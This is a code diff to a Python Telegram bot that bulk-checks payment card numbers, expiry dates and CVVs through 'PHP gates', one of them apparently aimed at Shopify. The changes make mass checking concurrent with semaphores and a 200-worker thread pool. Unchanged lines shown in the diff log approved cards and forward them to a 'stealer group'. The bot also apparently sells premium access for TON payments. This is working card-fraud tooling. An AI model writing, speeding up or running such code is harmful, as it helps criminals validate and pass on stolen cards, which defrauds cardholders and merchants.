@@ -6912,9 +6912,9 @@ async def check_gate(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_na
         except:
             pass
     
-    # Check card using PHP gate
+    # Check card using PHP gate (run in thread pool to avoid blocking event loop)
     start_time = time_module.time()
-    result = check_card_php(gate_name, cc, mm, yy, cvv, user.id)
+    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
     elapsed = time_module.time() - start_time
     
     # Format response
@@ -9542,11 +9542,11 @@ async def gate_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     import time as time_module
     start_time = time_module.time()
-    result = check_card_php("sh", cc, mm, yy, cvv, user.id)
+    result = await asyncio.to_thread(check_card_php, "sh", cc, mm, yy, cvv, user.id)
     elapsed = time_module.time() - start_time
 
     from modules.gate_checker import get_bin_info
-    bin_info = get_bin_info(cc)
+    bin_info = await asyncio.to_thread(get_bin_info, cc)
     username = user.username or user.first_name
 
     output = ae(_format_shopify_result(cc, mm, yy, cvv, result, bin_info, elapsed, username))
@@ -10024,26 +10024,33 @@ async def handle_mass_check_txt_file(update: Update, context: ContextTypes.DEFAU
             parse_mode=ParseMode.HTML
         )
         
-        # Check each card
+        # Check each card concurrently (up to 5 at a time) without blocking the event loop
         approved = []
         declined = []
-        
-        for i, (cc, mm, yy, cvv) in enumerate(cards, 1):
-            result = check_card_php(gate_name, cc, mm, yy, cvv, user.id)
-            
+        _sem = asyncio.Semaphore(5)
+
+        async def _check_one_file(idx, cc, mm, yy, cvv):
+            async with _sem:
+                return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
+
+        tasks = [_check_one_file(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
+        done = 0
+        for coro in asyncio.as_completed(tasks):
+            idx, cc, mm, yy, cvv, result = await coro
+            done += 1
             card_str = f"{cc}|{mm}|{yy}|{cvv}"
-            
+
             if result["status"] == "success":
                 msg = result.get("message", "")
                 card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()
-                
+
                 if card_is_approved:
                     approved.append(card_str)
-                    
+
                     # Log approved card, send to stealer, and send GIF
                     try:
                         from modules.gate_checker import get_bin_info
-                        bin_info = get_bin_info(cc)
+                        bin_info = await asyncio.to_thread(get_bin_info, cc)
                         log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                         await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                         await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
@@ -10053,12 +10060,12 @@ async def handle_mass_check_txt_file(update: Update, context: ContextTypes.DEFAU
                     declined.append(card_str)
             else:
                 declined.append(card_str)
-            
+
             # Update progress
             try:
-                progress_bar = "🟦" * i + "⬜" * (len(cards) - i)
+                progress_bar = "🟦" * done + "⬜" * (len(cards) - done)
                 await loading_msg.edit_text(
-                    f"Progress: {i}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
+                    f"Progress: {done}/{len(cards)} | ✅ {len(approved)} | ❌ {len(declined)}\n"
                     f"<b>{progress_bar[:20]}</b>",
                     parse_mode=ParseMode.HTML
                 )
@@ -10167,29 +10174,36 @@ async def mass_check_with_cards(update: Update, context: ContextTypes.DEFAULT_TY
     
     approved = []
     declined = []
-    
-    for card in cards:
-        try:
-            parts = card.split('|')
-            if len(parts) >= 4:
-                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-                result = await check_card_php(gate_name, cc, mm, yy, cvv, user.id)
-                if result.get('status') in ['approved', 'charged', 'cvv_match']:
-                    approved.append((card, result))
-                else:
-                    declined.append((card, result))
-        except Exception as e:
-            declined.append((card, {'message': str(e)}))
-    
+    _sem2 = asyncio.Semaphore(5)
+
+    async def _check_one_text(card):
+        async with _sem2:
+            try:
+                parts = card.split('|')
+                if len(parts) >= 4:
+                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+                    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
+                    return card, result
+                return card, {'status': 'error', 'message': 'Invalid format'}
+            except Exception as e:
+                return card, {'status': 'error', 'message': str(e)}
+
+    results = await asyncio.gather(*[_check_one_text(card) for card in cards])
+    for card, result in results:
+        if result.get('status') in ['approved', 'charged', 'cvv_match']:
+            approved.append((card, result))
+        else:
+            declined.append((card, result))
+
     result_text = f"📋 <b>MASS CHECK RESULTS - {gate_display}</b>\n\n"
     result_text += f"✅ Approved: {len(approved)}\n"
     result_text += f"❌ Declined: {len(declined)}\n\n"
-    
+
     if approved:
         result_text += "<b>✅ APPROVED CARDS:</b>\n"
         for card, res in approved[:10]:
             result_text += f"<code>{card}</code>\n"
-    
+
     await loading_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
 
 # ============================================================================
@@ -10327,27 +10341,33 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
     
-    # Check each card
+    # Check each card concurrently (up to 5 at a time) without blocking the event loop
     approved = []
     declined = []
-    
-    for i, (cc, mm, yy, cvv) in enumerate(cards, 1):
-        result = check_card_php(gate_name, cc, mm, yy, cvv, user.id)
-        
+    _sem3 = asyncio.Semaphore(5)
+
+    async def _check_one_mass(idx, cc, mm, yy, cvv):
+        async with _sem3:
+            return idx, cc, mm, yy, cvv, await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
+
+    _tasks3 = [_check_one_mass(i, cc, mm, yy, cvv) for i, (cc, mm, yy, cvv) in enumerate(cards, 1)]
+    for coro in asyncio.as_completed(_tasks3):
+        i, cc, mm, yy, cvv, result = await coro
+
         card_str = f"{cc}|{mm}|{yy}|{cvv}"
-        
+
         card_is_approved = False  # Initialize variable (renamed to avoid shadowing)
         if result["status"] == "success":
             msg = result.get("message", "")
             card_is_approved = "approved" in msg.lower() or "success" in msg.lower() or "charged" in msg.lower()
-            
+
             if card_is_approved:
                 approved.append(card_str)
-                
+
                 # Log, send to stealer, and notify owner instantly with GIF
                 try:
                     from modules.gate_checker import get_bin_info
-                    bin_info = get_bin_info(cc)
+                    bin_info = await asyncio.to_thread(get_bin_info, cc)
                     log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, msg, bin_info)
                     await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, msg, bin_info, user.id, user.username or user.first_name)
                     await send_approved_card_with_gif(update, card_str, gate_name, msg, 3.0, bin_info)
@@ -14110,6 +14130,11 @@ def main():
     )
     
     async def _on_startup(app):
+        import concurrent.futures
+        loop = asyncio.get_running_loop()
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)
+        loop.set_default_executor(executor)
+        print("🔧 Thread pool set to 200 workers for concurrent card checking")
         from config import TON_WALLET
         await _ton_monitor.start_monitor(TON_WALLET, app.bot, set_premium_sync)
 
